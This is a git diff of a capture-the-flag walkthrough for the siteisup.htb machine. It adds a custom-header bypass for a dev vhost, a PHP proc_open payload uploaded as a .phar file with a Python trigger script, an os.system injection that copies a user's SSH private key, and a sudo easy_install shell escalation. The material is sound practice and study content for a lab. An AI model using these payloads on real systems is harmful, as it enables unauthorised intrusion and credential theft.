@@ -1,24 +1,45 @@
 Initial Nmap Scan
 
-``bash
+```bash
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-```
+``
 
 Exploring Local Git dir
 
-``bash
+```bash
 Git branch -a
 Git log main
-Git show objectId
-``
+commit 8812785e31c879261050e72e20f298ae8c43b565
+Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
+Date:   Wed Oct 20 16:38:54 2021 +0200
+
+    New technique in header to protect our dev vhost.
+
+git show 8812785e31c879261050e72e20f298ae8c43b565
+commit 8812785e31c879261050e72e20f298ae8c43b565
+Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
+Date:   Wed Oct 20 16:38:54 2021 +0200
+
+    New technique in header to protect our dev vhost.
+
+diff --git a/.htaccess b/.htaccess
+index 44ff240..b317ab5 100644
+--- a/.htaccess
++++ b/.htaccess
+@@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev "only4dev" Required-Header
+ Order Deny,Allow
+ Deny from All
+ Allow from env=Required-Header
+
+```
 
 Found another domain dev.siteisup.htb source code and another juicey information to access the domain 
 It only access for developers Using coustom header "Special-Dev: only4dev"
 
 Accessing dev.siteisup.htb
 
-FootHold 
+**FootHold**
 
 Exploiting upload vulnerability and gain the shell but there has some fillters using to prevent to upload malicious file. we have only one way to upload a php file to gain code execution which is uploading a injected php code as phar file. Their is an another problem to gain shell the normal php shell command functions are disabled expect "proc_open" we get that info from "phpinfo" page 
 
@@ -29,10 +50,9 @@ Reference [http://www.navioo.com/php/docs/function.proc-open.php](http://www.nav
 
 Payload 
 
-``php
+```php
 <?php
-/* assume that strlen($in) is about 30k
-*/
+
 $descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
@@ -54,7 +74,23 @@ if (is_resource($process)) {
   $return_value = proc_close($process);
 }
 ?>
-``
+```
+
+My coustom python script for trigger the payload
+
+req.py
+```python
+import requests
+import re
+
+header = {"Special-Dev": "only4dev"}
+r = requests.get("http://dev.siteisup.htb/uploads/",headers=header)
+md5 = re.findall(r'(?i)(?<![a-z0-9])[a-f0-9]{32}(?![a-z0-9])',r.text)
+
+file_get = requests.get("http://dev.siteisup.htb/uploads/"+md5[1]+"/test.phar",headers=header)
+print(file_get.text)
+
+```
 
 Escalating more privileged user
 
@@ -64,20 +100,20 @@ Home dir of the user developer has a coustom binary called siteisup which belong
 
 Paylod for getting the developer ssh Key
 
-``python
+```python
 __import__("os")os.system("cat /home/developer/.ssh/id_rsa > /tmp/key")
-``
-Privilege Escalation
+```
+**Privilege Escalation**
 
 There is a Binary called  easy_install which has the permission running as superuser(Sudo)
 
 Exploit 
 
-``bash
+```bash
 TF=$(mktemp -d)
 echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 sudo easy_install $TF
-``
+```
 Reference [GtfoBin](https://gtfobins.github.io/gtfobins/easy_install/)
 
 
